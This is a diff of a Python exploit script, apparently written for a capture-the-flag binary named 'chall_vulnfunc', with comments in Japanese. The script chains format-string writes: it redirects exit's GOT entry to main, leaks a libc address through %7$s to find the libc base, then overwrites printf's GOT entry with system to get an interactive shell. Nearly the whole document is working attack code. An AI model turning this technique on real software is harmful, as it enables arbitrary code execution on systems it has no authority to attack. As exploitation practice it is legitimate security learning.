@@ -4,9 +4,6 @@
 userがprintfの書式を自由に設定できる場合、攻撃が可能
 printf(buf);
 """
-
-
-
 from ptrlib import *
 
 
@@ -22,9 +19,10 @@ def show_memory_chunk(chunks:list):
     print()
 
 
-def show_text(s:str):
+def show_payload(s:str):
     for i,j in enumerate(range(0, len(s), 8)):
         print(i + 6, s[j:j+8])
+
 
 def get_chunk(func_addr: int):
     chunks = split_byte(func_addr, 1)
@@ -42,34 +40,31 @@ def get_chunk(func_addr: int):
     )
     return chunk1, chunk2, chunk3, chunk4
 
-# 書式文字列攻撃を行う関数
+
 def fsb_unit(func_addr:int , got_target_addr: int) -> bytes:
     chunk1,chunk2,chunk3,chunk4 = get_chunk(func_addr)
 
-    delta = chunk1 - chunk2
-    format_string = f'%{str(chunk2)}c%09$hn' # $6
-    format_string += f'%{str(delta)}c%10$hn' # $7
+    chunk1_is_smaller_than_chunk2 = chunk1 < chunk2
+    delta = chunk2 - chunk1 if chunk1_is_smaller_than_chunk2 else chunk1 - chunk2
+    format_string = f'%{str(chunk1 if chunk1_is_smaller_than_chunk2 else chunk2)}c%10$hn'
+    format_string += f'%{str(delta)}c%11$hn'
     format_string += "p" * (8 - len(format_string) % 8) # 詰物 # $8
-    payload = format_string.encode("ascii") # $10
-    payload += p64(got_target_addr + 2)         # $11
-    payload += p64(got_target_addr)
-    return payload
-
-def fsb_unit2(func_addr:int , got_target_addr: int) -> bytes:
-    chunk1,chunk2,chunk3,chunk4 = get_chunk(func_addr)
-
-    delta = chunk2 - chunk1 if chunk1 < chunk2 else chunk1 - chunk2
-    print("delta", delta)
-    format_string = f'%{str(chunk1 if chunk1 < chunk2 else chunk2)}c%10$hn' # $6
-    format_string += f'%{str(delta)}c%11$hn' # $7
-    format_string += "p" * (8 - len(format_string) % 8) # 詰物 # $8
-    payload = format_string.encode("ascii") # $10
-    if chunk1 < chunk2:
-        payload += p64(got_target_addr)         # $11
-        payload += p64(got_target_addr + 2)
+    format_string_length = len(format_string)
+    match format_string_length // 8:
+        case 3:
+            format_string += "pppppppp" # アドレスを各領域を固定したいので長さが足りない場合は詰物をする
+        case 4:
+            pass
+        case _:
+            print("ERROR")
+    payload = format_string.encode("ascii")
+    if chunk1_is_smaller_than_chunk2:
+        payload += p64(got_target_addr)         # $10
+        payload += p64(got_target_addr + 2)     # $11
     else:
-        payload += p64(got_target_addr + 2)
+        payload += p64(got_target_addr + 2)     # $10
         payload += p64(got_target_addr)         # $11
+    print("payload size",hex(len(payload)))
     return payload
 
 
@@ -102,36 +97,37 @@ uv run fsb.py
     proc = Process("./chall_vulnfunc")
     libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6") # ldd chall_vulnfunc
 
+    # ==== return to main ====
     addr_main = elf.symbol("main")
     addr_exit = elf.got("exit")
     print("addr_main",hex(addr_main))
     print("addr_exit",hex(addr_exit)) 
     payload = fsb_unit(addr_main, addr_exit)
+    show_payload(payload)
+    proc.sendafter("Input message", payload)
 
-    show_text(payload)
-    proc.sendafter("Input message", payload) # mainを何度も呼び出せるようにするやつ
-
-    addr_setbuf_got = elf.got("setbuf")
-    payload = b"%7$sPPPP" # got addrを調べる
+    # == libc base addr leak ==
+    addr_setbuf_got = elf.got("setbuf") # got addrを調べる
+    payload = b"%7$sPPPP" 
     payload+= p64(addr_setbuf_got) 
 
-    proc.sendafter("Input message", payload) # libc base addr leakさせるため
+    proc.sendafter("Input message", payload)
     proc.recv(1) # putsの出力する改行を飛ばす
     leaked = proc.recv(6)
     leaked_setbuf = int.from_bytes(leaked, byteorder='little') # 実際にリークされたアドレス
     offset_setbuf = libc_elf.symbol("setbuf")
-    libc_elf.base = leaked_setbuf - offset_setbuf # libc base addr leak !
+    libc_elf.base = leaked_setbuf - offset_setbuf # leakしたlibcのベースアドレスをセット
 
-    #addr_printf = elf.got("printf")
+    # ==== printf to system ====
     addr_printf = elf.got("printf")
-    addr_system = libc_elf.symbol("system")
+    addr_system = libc_elf.symbol("system") # libc leakの結果を利用している
     chunk1_g,chunk2_g,chunk3_g,chunk4_g = get_chunk(libc_elf.symbol("printf"))
 
     print("addr_printf", hex(addr_printf))
     print("addr_system", hex(addr_system)) 
-    payload = fsb_unit2(addr_system, addr_printf)
-    show_text(payload)
-    proc.sendafter("Input message", payload) # mainを何度も呼び出せるようにするやつ
+    payload = fsb_unit(addr_system, addr_printf)
+    show_payload(payload)
+    proc.sendafter("Input message", payload)
     proc.interactive()
     return
 
